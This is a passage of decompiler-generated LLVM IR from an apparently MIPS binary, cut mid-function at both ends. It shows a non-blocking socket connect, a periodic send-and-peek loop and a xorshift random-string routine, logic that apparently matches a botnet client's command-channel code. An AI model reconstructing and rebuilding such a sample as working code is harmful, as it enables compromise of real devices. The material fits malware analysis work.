  %v3_402494 = load i32, i32* @global_var_449454.5, align 4
  store i32 %v3_402494, i32* @t9, align 4
  %v2_40249c = call i32 @function_406440(i32 10)
  store i32 %v2_40249c, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4024ac

dec_label_pc_4024ac:                              ; preds = %dec_label_pc_402450, %dec_label_pc_402478
  %v3_4024ac = load i32, i32* @global_var_449444.201, align 4
  store i32 %v3_4024ac, i32* @t9, align 4
  store i32 0, i32* @a2, align 4
  %v3_4024b4 = call i32 @function_405aa0(i32 2, i32 0)
  store i32 %v3_4024b4, i32* %v0.global-to-local, align 4
  store i32 %v2_401ef4, i32* @gp, align 4
  %v1_4024c0 = load i32, i32* @s1, align 4
  %v2_4024c0 = icmp eq i32 %v3_4024b4, %v1_4024c0
  %v4_4024c0 = load i32, i32* @s2, align 4
  %v5_4024c0 = add i32 %v4_4024c0, -28632
  %v6_4024c0 = inttoptr i32 %v5_4024c0 to i32*
  store i32 %v3_4024b4, i32* %v6_4024c0, align 4
  br i1 %v2_4024c0, label %dec_label_pc_4024ac.dec_label_pc_40253c_crit_edge, label %dec_label_pc_4024c4

dec_label_pc_4024ac.dec_label_pc_40253c_crit_edge: ; preds = %dec_label_pc_4024ac
  %v0_40253c.pre = load i32, i32* @gp, align 4
  br label %dec_label_pc_40253c

dec_label_pc_4024c4:                              ; preds = %dec_label_pc_4024ac
  %v3_4024cc = load i32, i32* @global_var_4493cc.202, align 4
  store i32 %v3_4024cc, i32* @t9, align 4
  %v3_4024d0 = load i32, i32* @global_var_449518.152, align 4
  store i32 2, i32* %stack_var_-980, align 4
  store i32 1992, i32* %v0.global-to-local, align 4
  %v7_4024dc = call i32 @function_4055b0(i32 %v3_4024d0)
  store i32 %v7_4024dc, i32* %v0.global-to-local, align 4
  %v0_4024e8 = load i32, i32* @s2, align 4
  %v1_4024e8 = add i32 %v0_4024e8, -28632
  %v2_4024e8 = inttoptr i32 %v1_4024e8 to i32*
  %v3_4024e8 = load i32, i32* %v2_4024e8, align 4
  store i32 %v3_4024e8, i32* @s0, align 4
  %v3_4024ec = load i32, i32* @global_var_449294.203, align 4
  store i32 %v3_4024ec, i32* @t9, align 4
  store i32 3, i32* @a1, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  store i32 %v3_4024e8, i32* @a0, align 4
  %v5_4024fc = call i32 @function_404870()
  store i32 %v5_4024fc, i32* %v0.global-to-local, align 4
  %v0_402508 = load i32, i32* @s0, align 4
  store i32 %v0_402508, i32* @a0, align 4
  %v3_40250c = load i32, i32* @global_var_449294.203, align 4
  store i32 %v3_40250c, i32* @t9, align 4
  %v1_402510 = or i32 %v5_4024fc, 128
  store i32 %v1_402510, i32* %a2.global-to-local, align 4
  store i32 4, i32* @a1, align 4
  %v1_402514 = call i32 @function_404870()
  store i32 %v1_402514, i32* %v0.global-to-local, align 4
  %v0_402520 = load i32, i32* @s2, align 4
  %v1_402520 = add i32 %v0_402520, -28632
  %v2_402520 = inttoptr i32 %v1_402520 to i32*
  %v3_402520 = load i32, i32* %v2_402520, align 4
  %v3_402524 = load i32, i32* @global_var_4494a8.204, align 4
  store i32 %v3_402524, i32* @t9, align 4
  store i32 %v2_402528, i32* %a1.global-to-local, align 4
  store i32 16, i32* %a2.global-to-local, align 4
  %v5_40252c = call i32 @function_4056c0(i32 %v3_402520, %sockaddr* %v4_40252c, i32 16)
  store i32 %v5_40252c, i32* %v0.global-to-local, align 4
  store i32 %v2_401ef4, i32* @gp, align 4
  br label %dec_label_pc_40253c

dec_label_pc_40253c:                              ; preds = %dec_label_pc_4024ac.dec_label_pc_40253c_crit_edge, %dec_label_pc_4023c4, %dec_label_pc_4024c4
  %v0_402548 = phi i32 [ %v0_40253c.pre, %dec_label_pc_4024ac.dec_label_pc_40253c_crit_edge ], [ %v0_4023c8, %dec_label_pc_4023c4 ], [ %v2_401ef4, %dec_label_pc_4024c4 ]
  %v1_40253c = add i32 %v0_402548, -32744
  %v2_40253c = inttoptr i32 %v1_40253c to i32*
  %v3_40253c = load i32, i32* %v2_40253c, align 4
  store i32 %v3_40253c, i32* %v0.global-to-local, align 4
  %v1_402544 = add i32 %v3_40253c, -27372
  %v2_402544 = inttoptr i32 %v1_402544 to i8*
  %v3_402544 = load i8, i8* %v2_402544, align 1
  %v4_402544 = sext i8 %v3_402544 to i32
  store i32 %v4_402544, i32* %a3.global-to-local, align 4
  %v3_402548 = load i32, i32* %v2_40253c, align 4
  store i32 %v3_402548, i32* %v0.global-to-local, align 4
  %v1_40254c = icmp eq i8 %v3_402544, 0
  br i1 %v1_40254c, label %dec_label_pc_4025a0, label %dec_label_pc_402550

dec_label_pc_402550:                              ; preds = %dec_label_pc_40253c
  %v1_402554 = add i32 %v3_402548, -28632
  %v2_402554 = inttoptr i32 %v1_402554 to i32*
  %v3_402554 = load i32, i32* %v2_402554, align 4
  store i32 %v3_402554, i32* %a1.global-to-local, align 4
  store i32 1, i32* %a2.global-to-local, align 4
  %v1_40255c = udiv i32 %v3_402554, 32
  %v1_402560 = mul nuw nsw i32 %v1_40255c, 4
  %v2_402564 = add i32 %v1_402560, %v4_40254c
  store i32 %v2_402564, i32* %v1.global-to-local, align 4
  %v1_402568 = add i32 %v2_402564, 196
  %v2_402568 = inttoptr i32 %v1_402568 to i32*
  %v3_402568 = load i32, i32* %v2_402568, align 4
  %v2_40256c = shl i32 1, %v3_402554
  %v2_402570 = or i32 %v3_402568, %v2_40256c
  store i32 %v2_402570, i32* %v2_402568, align 4
  store i32 10, i32* %v0.global-to-local, align 4
  store i32 10, i32* %stack_var_-988, align 4
  %v0_402584 = load i32, i32* %a3.global-to-local, align 4
  %v1_402584 = load i32, i32* %a2.global-to-local, align 4
  %v2_402584 = icmp eq i32 %v0_402584, %v1_402584
  %v3_402584 = load i32, i32* %a1.global-to-local, align 4
  %v4_402584 = add i32 %v3_402584, 1
  br i1 %v2_402584, label %dec_label_pc_402588, label %dec_label_pc_402598

dec_label_pc_402588:                              ; preds = %dec_label_pc_402550
  store i32 0, i32* %a2.global-to-local, align 4
  store i32 %v2_40239c, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_402598

dec_label_pc_402598:                              ; preds = %dec_label_pc_402550, %dec_label_pc_402588
  store i32 0, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_4025a0

dec_label_pc_4025a0:                              ; preds = %dec_label_pc_40253c, %dec_label_pc_402598
  %v1_4025b0 = phi i32 [ %v4_40254c, %dec_label_pc_40253c ], [ %v4_402584, %dec_label_pc_402598 ]
  %v0_4025a0 = phi i32 [ %v3_402548, %dec_label_pc_40253c ], [ 10, %dec_label_pc_402598 ]
  %v1_4025a0 = add i32 %v0_4025a0, -28632
  %v2_4025a0 = inttoptr i32 %v1_4025a0 to i32*
  %v3_4025a0 = load i32, i32* %v2_4025a0, align 4
  store i32 %v3_4025a0, i32* %a1.global-to-local, align 4
  store i32 1, i32* %v0.global-to-local, align 4
  %v1_4025a8 = udiv i32 %v3_4025a0, 32
  %v1_4025ac = mul nuw nsw i32 %v1_4025a8, 4
  %v2_4025b0 = add i32 %v1_4025ac, %v1_4025b0
  store i32 %v2_4025b0, i32* %v1.global-to-local, align 4
  %v1_4025b4 = add i32 %v2_4025b0, 324
  %v2_4025b4 = inttoptr i32 %v1_4025b4 to i32*
  %v3_4025b4 = load i32, i32* %v2_4025b4, align 4
  %v2_4025b8 = shl i32 1, %v3_4025a0
  %v2_4025bc = or i32 %v3_4025b4, %v2_4025b8
  store i32 10, i32* %v0.global-to-local, align 4
  store i32 %v2_4025bc, i32* %v2_4025b4, align 4
  %v0_4025c8 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_4025c8, i32* %stack_var_-988, align 4
  store i32 %v2_4023a0, i32* %a2.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  %v0_4025dc = load i32, i32* @gp, align 4
  %v1_4025dc = add i32 %v0_4025dc, -32144
  %v2_4025dc = inttoptr i32 %v1_4025dc to i32*
  %v3_4025dc = load i32, i32* %v2_4025dc, align 4
  store i32 %v2_4025e0, i32* %v0.global-to-local, align 4
  store i32 0, i32* %a3.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4025dc)
  store i32 %v2_401ef4, i32* @gp, align 4
  %v0_4025f4 = load i32, i32* %v0.global-to-local, align 4
  %v1_4025f4 = icmp eq i32 %v0_4025f4, 0
  store i32 %v2_4025e0, i32* %v1.global-to-local, align 4
  br i1 %v1_4025f4, label %dec_label_pc_4025f8, label %dec_label_pc_402658.thread

dec_label_pc_402658.thread:                       ; preds = %dec_label_pc_4025a0
  store i32 4, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_402660

dec_label_pc_4025f8:                              ; preds = %dec_label_pc_4025a0
  %v0_402600 = load i32, i32* @s5, align 4
  %v1_402600 = add i32 %v0_402600, 1
  store i32 %v1_402600, i32* @s5, align 4
  %v2_402608 = sext i32 %v1_402600 to i64
  %v4_402608 = mul nsw i64 %v2_402608, 715827883
  %v6_402608 = udiv i64 %v4_402608, 4294967296
  %v7_402608 = trunc i64 %v6_402608 to i32
  %v1_40260c = ashr i32 %v1_402600, 31
  %v2_402614 = sub i32 %v7_402608, %v1_40260c
  %v2_402620 = mul i32 %v2_402614, 6
  store i32 %v2_402620, i32* %v1.global-to-local, align 4
  %v2_402624 = icmp eq i32 %v1_402600, %v2_402620
  store i32 4, i32* %v0.global-to-local, align 4
  br i1 %v2_402624, label %dec_label_pc_402658, label %dec_label_pc_402394

dec_label_pc_402658:                              ; preds = %dec_label_pc_4025f8
  %v3_40262c = load i32, i32* @global_var_4491e8.9, align 4
  store i32 %v3_40262c, i32* %v0.global-to-local, align 4
  %v3_402634 = load i32, i32* @global_var_449420.206, align 4
  store i32 %v3_402634, i32* @t9, align 4
  %v3_402638 = load i32, i32* @global_var_449028.151, align 4
  store i32 ptrtoint (i32* @global_var_408250.207 to i32), i32* %a1.global-to-local, align 4
  store i32 6, i32* %a2.global-to-local, align 4
  store i32 16384, i32* %a3.global-to-local, align 4
  %v6_402644 = call i32 @function_405940(i32 %v3_402638, i32* nonnull @global_var_408250.207, i32 6, i32 16384)
  store i32 %v2_401ef4, i32* @gp, align 4
  store i32 0, i32* @s5, align 4
  %v0_40265c.pr = load i32, i32* %v1.global-to-local, align 4
  %v2_40265c = icmp eq i32 %v0_40265c.pr, -1
  store i32 4, i32* %v0.global-to-local, align 4
  br i1 %v2_40265c, label %dec_label_pc_402394, label %dec_label_pc_402660

dec_label_pc_402660:                              ; preds = %dec_label_pc_402658.thread, %dec_label_pc_402658
  %v3_402664 = load i32, i32* @global_var_4491e8.9, align 4
  store i32 %v3_402664, i32* @s0, align 4
  %v3_40266c = load i8, i8* @global_var_449514.153, align 1
  %v4_40266c = sext i8 %v3_40266c to i32
  store i32 %v4_40266c, i32* %v0.global-to-local, align 4
  %v1_402674 = icmp eq i8 %v3_40266c, 0
  br i1 %v1_402674, label %dec_label_pc_402678, label %dec_label_pc_402708

dec_label_pc_402678:                              ; preds = %dec_label_pc_402660
  store i32 %v3_402664, i32* @s1, align 4
  %v3_402684 = load i32, i32* @global_var_449028.151, align 4
  %v1_40268c = udiv i32 %v3_402684, 32
  %v1_402690 = mul nuw nsw i32 %v1_40268c, 4
  %v0_402694 = load i32, i32* @sp, align 4
  %v2_402694 = add i32 %v0_402694, %v1_402690
  store i32 %v2_402694, i32* %v0.global-to-local, align 4
  %v1_402698 = add i32 %v2_402694, 356
  %v2_402698 = inttoptr i32 %v1_402698 to i32*
  %v3_402698 = load i32, i32* %v2_402698, align 4
  %tmp56 = shl i32 1, %v3_402684
  %v1_4026a43 = and i32 %v3_402698, %tmp56
  %v1_4026a8 = icmp eq i32 %v1_4026a43, 0
  store i32 %v4_4026a8, i32* %v0.global-to-local, align 4
  br i1 %v1_4026a8, label %dec_label_pc_402818, label %dec_label_pc_4026ac

dec_label_pc_4026ac:                              ; preds = %dec_label_pc_402678
  %v3_4026b0 = load i32, i32* @global_var_449304.208, align 4
  store i32 %v3_4026b0, i32* @t9, align 4
  store i32 65535, i32* %a1.global-to-local, align 4
  store i32 4103, i32* %a2.global-to-local, align 4
  store i32 %v3_4026c0, i32* %a3.global-to-local, align 4
  %v10_4026c0 = call i32 @function_405780(i32 %v3_402684, i32 65535, i32 4103, i32* nonnull %stack_var_-996, i32 %v4_4026a8)
  %v3_4026c8 = load i32, i32* %stack_var_-996, align 4
  store i32 %v2_401ef4, i32* @gp, align 4
  %v1_4026d0 = icmp eq i32 %v3_4026c8, 0
  store i32 1, i32* %v0.global-to-local, align 4
  br i1 %v1_4026d0, label %dec_label_pc_4026d4, label %dec_label_pc_402818

dec_label_pc_4026d4:                              ; preds = %dec_label_pc_4026ac
  %v3_4026dc = load i32, i32* @global_var_449420.206, align 4
  store i32 %v3_4026dc, i32* @t9, align 4
  %v3_4026e0 = load i32, i32* @global_var_449028.151, align 4
  store i8 1, i8* @global_var_449514.153, align 1
  store i32 ptrtoint (i32* @global_var_408258.209 to i32), i32* %a1.global-to-local, align 4
  store i32 6, i32* %a2.global-to-local, align 4
  store i32 16384, i32* %a3.global-to-local, align 4
  %v6_4026f0 = call i32 @function_405940(i32 %v3_4026e0, i32* nonnull @global_var_408258.209, i32 6, i32 16384)
  %v3_4026f8 = load i8, i8* @global_var_449514.153, align 1
  store i32 %v2_401ef4, i32* @gp, align 4
  %v1_402700 = icmp eq i8 %v3_4026f8, 0
  store i32 4, i32* %v0.global-to-local, align 4
  br i1 %v1_402700, label %dec_label_pc_402394, label %dec_label_pc_402708

dec_label_pc_402708:                              ; preds = %dec_label_pc_4026d4, %dec_label_pc_402660
  %v3_402708 = load i32, i32* %v2_402708, align 4
  store i32 %v3_402708, i32* @s3, align 4
  store i32 %v4_40254c, i32* @s4, align 4
  %v1_402710 = add i32 %v3_402708, -28632
  %v2_402710 = inttoptr i32 %v1_402710 to i32*
  %v3_402710 = load i32, i32* %v2_402710, align 4
  store i32 %v3_402710, i32* @s0, align 4
  %v1_402718 = udiv i32 %v3_402710, 32
  %v1_40271c = mul nuw nsw i32 %v1_402718, 4
  %v2_402720 = add i32 %v1_40271c, %v4_40254c
  store i32 %v2_402720, i32* %v0.global-to-local, align 4
  %v1_402724 = add i32 %v2_402720, 196
  %v2_402724 = inttoptr i32 %v1_402724 to i32*
  %v3_402724 = load i32, i32* %v2_402724, align 4
  %tmp57 = shl i32 1, %v3_402710
  %v1_4027302 = and i32 %v3_402724, %tmp57
  %v1_402734 = icmp eq i32 %v1_4027302, 0
  store i32 4, i32* %v0.global-to-local, align 4
  br i1 %v1_402734, label %dec_label_pc_402394, label %dec_label_pc_402738

dec_label_pc_402738:                              ; preds = %dec_label_pc_402708
  store i32 -1, i32* @s2, align 4
  %v2_402740 = icmp eq i32 %v3_402710, -1
  store i32 6, i32* %v0.global-to-local, align 4
  br i1 %v2_402740, label %dec_label_pc_402390, label %dec_label_pc_402744

dec_label_pc_402744:                              ; preds = %dec_label_pc_402738
  %v3_402748 = load i32, i32* %v2_402748, align 4
  store i16 6, i16* %stack_var_-1000, align 2
  call void @__pseudo_call(i32 %v3_402748)
  %v0_40275c = load i32, i32* @s0, align 4
  %v3_402760 = load i32, i32* @global_var_4494ac.211, align 4
  store i32 %v3_402760, i32* @t9, align 4
  %v0_402764 = load i32, i32* %v0.global-to-local, align 4
  %v1_402764 = inttoptr i32 %v0_402764 to i32*
  store i32 0, i32* %v1_402764, align 4
  store i32 %v4_40254c, i32* %a1.global-to-local, align 4
  store i32 2, i32* %a2.global-to-local, align 4
  store i32 16386, i32* %a3.global-to-local, align 4
  %v1_402774 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v1_402774, i32* @s1, align 4
  %v7_402774 = call i32 @function_405860(i32 %v0_40275c, i32* %v6_402774, i32 2, i32 16386)
  store i32 %v7_402774, i32* %v0.global-to-local, align 4
  store i32 %v2_401ef4, i32* @gp, align 4
  %v1_402780 = load i32, i32* @s2, align 4
  %v2_402780 = icmp eq i32 %v7_402774, %v1_402780
  br i1 %v2_402780, label %dec_label_pc_4027f0, label %dec_label_pc_402784

dec_label_pc_402784:                              ; preds = %dec_label_pc_402744
  %v1_402788 = icmp eq i32 %v7_402774, 0
  br i1 %v1_402788, label %dec_label_pc_402818, label %dec_label_pc_40278c

dec_label_pc_40278c:                              ; preds = %dec_label_pc_402784
  %v3_402790 = load i16, i16* %stack_var_-1000, align 2
  %v4_402790 = sext i16 %v3_402790 to i32
  store i32 %v4_402790, i32* %a2.global-to-local, align 4
  %v1_402798 = icmp eq i16 %v3_402790, 0
  %v3_402798 = icmp ult i16 %v3_402790, 513
  %v4_402798 = zext i1 %v3_402798 to i32
  store i32 %v4_402798, i32* %v0.global-to-local, align 4
  br i1 %v1_402798, label %dec_label_pc_40279c, label %dec_label_pc_4027c0

dec_label_pc_40279c:                              ; preds = %dec_label_pc_40278c
  %v0_4027a0 = load i32, i32* @s3, align 4
  %v1_4027a0 = add i32 %v0_4027a0, -28632
  %v2_4027a0 = inttoptr i32 %v1_4027a0 to i32*
  %v3_4027a0 = load i32, i32* %v2_4027a0, align 4
  %v3_4027a4 = load i32, i32* @global_var_4494ac.211, align 4
  store i32 %v3_4027a4, i32* @t9, align 4
  store i32 %v4_40254c, i32* %a1.global-to-local, align 4
  store i32 2, i32* %a2.global-to-local, align 4
  store i32 16384, i32* %a3.global-to-local, align 4
  %v6_4027b0 = call i32 @function_405860(i32 %v3_4027a0, i32* nonnull %v6_402774, i32 2, i32 16384)
  store i32 %v6_4027b0, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4027c0

dec_label_pc_4027c0:                              ; preds = %dec_label_pc_40278c, %dec_label_pc_40279c
  %v0_4027c0 = phi i32 [ %v4_402798, %dec_label_pc_40278c ], [ %v6_4027b0, %dec_label_pc_40279c ]
  %v1_4027c0 = icmp eq i32 %v0_4027c0, 0
  br i1 %v1_4027c0, label %dec_label_pc_4027c0.dec_label_pc_402818_crit_edge, label %dec_label_pc_4027c4

dec_label_pc_4027c0.dec_label_pc_402818_crit_edge: ; preds = %dec_label_pc_4027c0
  %v0_402818.pre = load i32, i32* @gp, align 4
  br label %dec_label_pc_402818

dec_label_pc_4027c4:                              ; preds = %dec_label_pc_4027c0
  %v0_4027c8 = load i32, i32* @s1, align 4
  %v1_4027c8 = inttoptr i32 %v0_4027c8 to i32*
  store i32 0, i32* %v1_4027c8, align 4
  %v3_4027cc = load i32, i32* @global_var_4494ac.211, align 4
  store i32 %v3_4027cc, i32* @t9, align 4
  store i32 %v2_4023b4, i32* @s0, align 4
  %v0_4027d4 = load i32, i32* @s3, align 4
  %v1_4027d4 = add i32 %v0_4027d4, -28632
  %v2_4027d4 = inttoptr i32 %v1_4027d4 to i32*
  %v3_4027d4 = load i32, i32* %v2_4027d4, align 4
  store i32 %v2_4023b4, i32* %a1.global-to-local, align 4
  store i32 16386, i32* %a3.global-to-local, align 4
  %v6_4027dc = call i32 @function_405860(i32 %v3_4027d4, i32* nonnull %stack_var_-548, i32 16386, i32 16386)
  store i32 %v6_4027dc, i32* %v0.global-to-local, align 4
  store i32 %v2_401ef4, i32* @gp, align 4
  %v1_4027e8 = load i32, i32* @s2, align 4
  %v2_4027e8 = icmp eq i32 %v6_4027dc, %v1_4027e8
  br i1 %v2_4027e8, label %dec_label_pc_4027f0, label %dec_label_pc_402810

dec_label_pc_4027f0:                              ; preds = %dec_label_pc_4027c4, %dec_label_pc_402744
  %v0_4027f0 = load i32, i32* @s1, align 4
  %v1_4027f0 = inttoptr i32 %v0_4027f0 to i32*
  %v2_4027f0 = load i32, i32* %v1_4027f0, align 4
  store i32 %v2_4027f0, i32* %v1.global-to-local, align 4
  store i32 4, i32* %v0.global-to-local, align 4
  switch i32 %v2_4027f0, label %dec_label_pc_402818 [
    i32 11, label %dec_label_pc_402390
    i32 4, label %dec_label_pc_402810.thread
  ]

dec_label_pc_402810.thread:                       ; preds = %dec_label_pc_4027f0
  store i32 4, i32* %stack_var_-992, align 4
  store i32 %v4_40254c, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_402834

dec_label_pc_402810:                              ; preds = %dec_label_pc_4027c4
  %v1_402810 = icmp eq i32 %v6_4027dc, 0
  store i32 %v4_40254c, i32* %a1.global-to-local, align 4
  br i1 %v1_402810, label %dec_label_pc_402818, label %dec_label_pc_402834

dec_label_pc_402818:                              ; preds = %dec_label_pc_4027f0, %dec_label_pc_4027c0.dec_label_pc_402818_crit_edge, %dec_label_pc_402810, %dec_label_pc_4026ac, %dec_label_pc_402784, %dec_label_pc_402678
  %v0_402818 = phi i32 [ %v0_402818.pre, %dec_label_pc_4027c0.dec_label_pc_402818_crit_edge ], [ %v2_401ef4, %dec_label_pc_402810 ], [ %v2_401ef4, %dec_label_pc_4026ac ], [ %v2_401ef4, %dec_label_pc_402784 ], [ %v2_401ef4, %dec_label_pc_402678 ], [ %v2_401ef4, %dec_label_pc_4027f0 ]
  %v1_402818 = add i32 %v0_402818, -32736
  %v2_402818 = inttoptr i32 %v1_402818 to i32*
  %v3_402818 = load i32, i32* %v2_402818, align 4
  %v1_402820 = add i32 %v3_402818, 7244
  call void @__pseudo_call(i32 %v1_402820)
  %v0_402834.pre = load i32, i32* @gp, align 4
  br label %dec_label_pc_402834

dec_label_pc_402834:                              ; preds = %dec_label_pc_402810.thread, %dec_label_pc_402810, %dec_label_pc_402818
  %v0_402834 = phi i32 [ %v2_401ef4, %dec_label_pc_402810 ], [ %v0_402834.pre, %dec_label_pc_402818 ], [ %v2_401ef4, %dec_label_pc_402810.thread ]
  %v1_402834 = add i32 %v0_402834, -32036
  %v2_402834 = inttoptr i32 %v1_402834 to i32*
  %v3_402834 = load i32, i32* %v2_402834, align 4
  store i32 2, i32* %a2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_402848.213 to i32), i32* @ra, align 4
  store i32 16384, i32* %a3.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_402834)
  %v0_40284c = load i32, i32* @s3, align 4
  %v1_40284c = add i32 %v0_40284c, -28632
  %v2_40284c = inttoptr i32 %v1_40284c to i32*
  %v3_40284c = load i32, i32* %v2_40284c, align 4
  %v3_402850 = load i32, i32* @global_var_4494ac.211, align 4
  store i32 %v3_402850, i32* @t9, align 4
  %v3_402854 = load i16, i16* %stack_var_-1000, align 2
  %v4_402854 = sext i16 %v3_402854 to i32
  store i32 %v4_402854, i32* %a2.global-to-local, align 4
  %v0_402858 = load i32, i32* @s0, align 4
  store i32 %v0_402858, i32* %a1.global-to-local, align 4
  store i32 16384, i32* %a3.global-to-local, align 4
  %v5_40285c = inttoptr i32 %v0_402858 to i32*
  %v6_40285c = call i32 @function_405860(i32 %v3_40284c, i32* %v5_40285c, i32 %v4_402854, i32 16384)
  %v3_402864 = load i16, i16* %stack_var_-1000, align 2
  %v4_402864 = sext i16 %v3_402864 to i32
  store i32 %v4_402864, i32* %a1.global-to-local, align 4
  store i32 %v2_401ef4, i32* @gp, align 4
  store i32 4, i32* %v0.global-to-local, align 4
  switch i16 %v3_402864, label %dec_label_pc_40287c [
    i16 263, label %dec_label_pc_402394
    i16 0, label %dec_label_pc_402394
  ]

dec_label_pc_40287c:                              ; preds = %dec_label_pc_402834
  %v3_402880 = load i32, i32* @global_var_4494c0.214, align 4
  store i32 %v3_402880, i32* @t9, align 4
  %v1_402888 = load i32, i32* @s0, align 4
  %v4_402888 = inttoptr i32 %v1_402888 to i32*
  %v5_402888 = call i32 @function_400624(i32* %v4_402888, i32 %v4_402864)
  store i32 %v5_402888, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_402898

dec_label_pc_402898:                              ; preds = %dec_label_pc_4020e4, %dec_label_pc_40287c
  %v4_4028b4 = phi i32 [ 0, %dec_label_pc_4020e4 ], [ %v5_402888, %dec_label_pc_40287c ]
  store i32 %v0_401f10, i32* %s1.global-to-local, align 4
  ret i32 %v4_4028b4

; uselistorder directives
  uselistorder i32 %v3_402710, { 1, 2, 0, 3 }
  uselistorder i32 %v3_402684, { 1, 2, 0 }
  uselistorder i32 %v3_4025a0, { 1, 0, 2 }
  uselistorder i32 %v3_402554, { 1, 0, 2 }
  uselistorder i32 %v1_4023bc, { 1, 2, 0 }
  uselistorder i32 %v1_4023a8, { 0, 2, 3, 1 }
  uselistorder i32 %v4_40254c, { 5, 2, 4, 6, 0, 7, 3, 1 }
  uselistorder i32 %v2_40239c, { 1, 0, 2 }
  uselistorder i32 %v3_4022cc, { 1, 0 }
  uselistorder i32 %v3_4022a0, { 1, 0, 2 }
  uselistorder i32 %v3_402294, { 1, 0, 2 }
  uselistorder i32 %v5_40220c, { 1, 0, 2 }
  uselistorder i32 %v3_402088, { 1, 0, 2 }
  uselistorder i32 %v3_401f7c, { 1, 0, 2 }
  uselistorder i32 %v2_401ef4, { 12, 5, 6, 0, 1, 2, 3, 4, 16, 15, 14, 13, 11, 10, 7, 17, 9, 8 }
  uselistorder i32* %stack_var_-932, { 1, 0 }
  uselistorder i32* %stack_var_-900, { 1, 0 }
  uselistorder i32* %stack_var_-980, { 1, 0, 2 }
  uselistorder i16* %stack_var_-1000, { 5, 4, 3, 2, 0, 1 }
  uselistorder i32* %stack_var_-996, { 1, 0, 2, 3 }
  uselistorder i32* %v0.global-to-local, { 3, 2, 4, 5, 7, 6, 14, 9, 8, 10, 12, 11, 13, 15, 16, 17, 18, 19, 20, 21, 1, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 52, 51, 53, 54, 56, 55, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 75, 74, 76, 77, 78, 0 }
  uselistorder i32* %a1.global-to-local, { 2, 3, 4, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32 16386, { 1, 2, 3, 0, 4 }
  uselistorder i8* @global_var_449514.153, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_404cd0, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_405b00, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_404404, { 1, 0 }
  uselistorder label %dec_label_pc_402898, { 1, 0 }
  uselistorder label %dec_label_pc_402834, { 2, 1, 0 }
  uselistorder label %dec_label_pc_402818, { 2, 0, 1, 4, 3, 5 }
  uselistorder label %dec_label_pc_4027c0, { 1, 0 }
  uselistorder label %dec_label_pc_402660, { 1, 0 }
  uselistorder label %dec_label_pc_4025a0, { 1, 0 }
  uselistorder label %dec_label_pc_402598, { 1, 0 }
  uselistorder label %dec_label_pc_40253c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_4024ac, { 1, 0 }
  uselistorder label %dec_label_pc_402450, { 1, 0 }
  uselistorder label %dec_label_pc_402394, { 1, 0, 3, 4, 5, 2, 6 }
  uselistorder label %dec_label_pc_402360, { 1, 0 }
  uselistorder label %dec_label_pc_40226c, { 1, 0 }
  uselistorder label %dec_label_pc_402240, { 1, 0 }
  uselistorder label %dec_label_pc_4020e4, { 1, 0 }
  uselistorder label %dec_label_pc_401fcc, { 1, 0 }
}

define i32 @function_4028bc() local_unnamed_addr {
dec_label_pc_4028bc:
  %v3_4028c8 = load i32, i32* @global_var_4491e8.9, align 4
  %v3_4028d0 = load i32, i32* @global_var_44951c.215, align 4
  %v3_4028d4 = load i32, i32* @global_var_449528.216, align 4
  store i32 %v3_4028c8, i32* @a3, align 4
  %v1_4028e0 = mul i32 %v3_4028d0, 2048
  %v1_4028e4 = udiv i32 %v3_4028d4, 524288
  %v2_4028e8 = xor i32 %v1_4028e0, %v3_4028d0
  %v2_4028ec = xor i32 %v1_4028e4, %v3_4028d4
  %v2_4028f0 = xor i32 %v2_4028ec, %v2_4028e8
  %v3_4028f4 = load i32, i32* @global_var_449520.217, align 4
  %v3_4028f8 = load i32, i32* @global_var_449524.218, align 4
  store i32 %v3_4028f8, i32* @a2, align 4
  %v1_4028fc = udiv i32 %v2_4028e8, 256
  %v2_402900 = xor i32 %v2_4028f0, %v1_4028fc
  store i32 %v3_4028f4, i32* @global_var_44951c.215, align 4
  store i32 %v3_4028f8, i32* @global_var_449520.217, align 4
  store i32 %v3_4028d4, i32* @global_var_449524.218, align 4
  store i32 %v2_402900, i32* @global_var_449528.216, align 4
  ret i32 %v2_402900

; uselistorder directives
  uselistorder i32 %v2_402900, { 1, 0 }
  uselistorder i32 %v3_4028d4, { 2, 1, 0 }
  uselistorder i32 %v3_4028d0, { 1, 0 }
}

define i32 @function_402918(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_402918:
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_40292c = load i32, i32* @s3, align 4
  store i32 %tmp, i32* %s2.global-to-local, align 4
  store i32 %arg2, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_40294c

dec_label_pc_40294c:                              ; preds = %dec_label_pc_40294c, %dec_label_pc_402918
  %v1_40294c = call i32 @function_4028bc()
  store i32 %v1_40294c, i32* @v0, align 4
  %v0_402958 = load i32, i32* @s3, align 4
  %v1_402958 = add i32 %v0_402958, -28628
  %v3_402964 = call i32 @function_404200(i32 %v1_402958)
  %v5_40296c = urem i32 %v1_40294c, %v3_402964
  %v0_402978 = load i32, i32* @s3, align 4
  %v1_402978 = add i32 %v0_402978, -28628
  %v2_402984 = add i32 %v1_402978, %v5_40296c
  %v1_402988 = inttoptr i32 %v2_402984 to i8*
